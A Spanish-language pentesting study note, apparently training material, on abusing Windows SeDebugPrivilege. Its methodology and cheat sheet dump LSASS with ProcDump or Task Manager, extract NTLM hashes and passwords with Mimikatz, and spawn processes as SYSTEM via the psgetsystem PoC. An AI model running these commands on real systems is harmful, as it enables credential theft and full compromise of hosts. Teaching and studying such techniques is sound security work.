---
tags:
  - windows
  - privex
---
## Conceptos Clave (TL;DR)
* `SeDebugPrivilege` permite a un usuario capturar información sensible de la memoria del sistema, o acceder y modificar estructuras del kernel y aplicaciones.
* Por defecto, este privilegio se asigna a administradores, pero suele otorgarse a desarrolladores que necesitan depurar componentes del sistema como parte de su trabajo diario.
* Este privilegio puede aprovecharse para extraer credenciales en texto claro o hashes NTLM de la memoria volcando el proceso LSASS, o para escalar directamente a `SYSTEM` suplantando el token de otro proceso.

## Herramientas Clave
* **ProcDump (SysInternals):** Utilizado para aprovechar el privilegio y generar un volcado de la memoria de procesos, en particular del proceso LSASS.
* **Mimikatz:** Empleado para procesar el archivo de volcado de memoria (minidump) y extraer los hashes NTLM u otras credenciales en texto claro de las sesiones activas.
* **Administrador de Tareas (Task Manager):** Utilizado como alternativa manual (Living off the Land) para crear un volcado del proceso LSASS en caso de no poder cargar herramientas en el objetivo.
* **psgetsystem:** Script de prueba de concepto que facilita la ejecución de código como `SYSTEM` al lanzar un proceso hijo e heredar el token de un proceso padre con mayores privilegios.

## Metodología Paso a Paso
1.  **Verificación de Privilegios:** Comprobar si el usuario actual posee `SeDebugPrivilege` habilitado en su sesión.
2.  **Opción A - Extracción de Credenciales:** Generar un volcado de memoria del proceso `lsass.exe` utilizando ProcDump o el Administrador de tareas. Una vez obtenido, analizar el archivo resultante con Mimikatz para extraer hashes NTLM que permitan el movimiento lateral (Pass-the-Hash).
3.  **Opción B - Ejecución de Código como SYSTEM:** Identificar el PID de un proceso ejecutado como `SYSTEM` (por ejemplo, `winlogon.exe`). Luego, cargar la PoC de PowerShell y ejecutarla para que inicie un nuevo proceso (como una consola o reverse shell) bajo el contexto de `SYSTEM` heredando su token.

## Cheat Sheet de Comandos

```cmd
# Comprueba la información de privilegios del usuario actual para verificar el estado de SeDebugPrivilege.
whoami /priv
```

```cmd
# Ejecuta ProcDump aceptando el acuerdo de licencia (-accepteula), crea un volcado de memoria completo (-ma) del proceso lsass.exe y lo guarda en el archivo especificado.
procdump.exe -accepteula -ma lsass.exe <OUTPUT_FILE.dmp>
```

```cmd
# Inicia Mimikatz.
mimikatz.exe

# Activa el registro en archivo (mimikatz.log) para guardar toda la salida; fundamental al volcar servidores con muchas credenciales.
log

# Cambia el contexto de Mimikatz para analizar el archivo de volcado de memoria de LSASS generado previamente.
sekurlsa::minidump <OUTPUT_FILE.dmp>

# Extrae la información de inicio de sesión, contraseñas y hashes del volcado procesado.
sekurlsa::logonpasswords
```

```powershell
# Muestra una lista de procesos en ejecución junto con su Process ID (PID) para identificar procesos del sistema operativo.
tasklist

# Ejecuta el script psgetsystem utilizando el PID del proceso padre objetivo (ej. winlogon.exe) para ejecutar el comando deseado. El tercer argumento en blanco es obligatorio.
[MyProcess]::CreateProcessFromParent(<SYSTEM_PID>, "<COMMAND_TO_EXECUTE>", "")
```

## "Gotchas" y Troubleshooting
* **Falta de herramientas:** Si no puedes cargar ProcDump en el objetivo y tienes acceso RDP, puedes realizar un volcado de memoria manualmente abriendo la pestaña Detalles del Administrador de Tareas, seleccionando `lsass.exe` y haciendo clic en "Create dump file".
* **Ausencia de acceso interactivo (RDP):** Frecuentemente no tendrás acceso por interfaz gráfica a un host. En escenarios con reverse shells o web shells, debes modificar los comandos de tu PoC para ejecutar acciones sin interfaz gráfica, como devolver una reverse shell como `SYSTEM` o crear un usuario administrador local.
* **Argumento en blanco obligatorio:** Al utilizar el script `psgetsystem` mediante la invocación `CreateProcessFromParent`, debes incluir un tercer argumento vacío (`""`) al final del comando; de lo contrario, la PoC fallará.
* **Automatización de PID:** En lugar de buscar manualmente el PID con `tasklist`, puedes usar el cmdlet `Get-Process` en PowerShell para obtener automáticamente el PID de un proceso de sistema conocido (como LSASS) y pasarlo a la función.
* **Enumeración invisible:** Un usuario sin privilegios de administrador local podría tener estos derechos asignados a través de políticas de grupo (GPO) o locales. Estas configuraciones no siempre pueden ser enumeradas remotamente mediante herramientas como BloodHound.
* **Prevención de pérdida de datos:** En servidores grandes con múltiples sesiones, la cantidad de credenciales en memoria puede ser abrumadora. Es indispensable usar el comando `log` en Mimikatz antes de volcar contraseñas para almacenar el output en un `.txt`.